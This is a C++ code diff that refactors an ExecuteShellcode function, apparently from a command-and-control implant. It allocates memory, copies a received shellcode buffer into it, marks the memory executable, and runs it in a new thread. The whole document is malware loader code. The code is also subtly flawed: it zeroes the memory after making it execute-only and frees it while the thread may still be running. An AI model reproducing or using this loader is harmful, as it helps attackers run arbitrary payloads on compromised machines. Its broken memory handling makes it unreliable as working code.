@@ -194,33 +194,36 @@ namespace Memory {
 
         BOOL ExecuteShellcode(_parser& parser) {
 
-            void* address = { };
+            void* base      = nullptr;
+            void(*exec)()   = nullptr;
 
             bool success = true;
             size_t size = parser.Length;
 
-            if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+            if (!NT_SUCCESS(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                 // LOG ERROR
                 success = false;
                 goto defer;
             }
 
-            MemCopy(address, parser.buffer, parser.Length);
-            if (!NT_SUCCESS(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
+            MemCopy(base, parser.buffer, parser.Length);
+
+            if (!NT_SUCCESS(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, nullptr))) {
                 // LOG ERROR
                 success = false;
                 goto defer;
             }
 
-            const auto exec = (void(*)()) address;
+            exec = (void(*)()) base;
             Ctx->win32.CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE) exec, nullptr, 0, nullptr);
 
-            MemSet(address, 0, size);
+            MemSet(base, 0, size);
 
         defer:
-            if (address) {
-                Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
+            if (base) {
+                Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_FREE);
             }
+
             return success;
         }
 
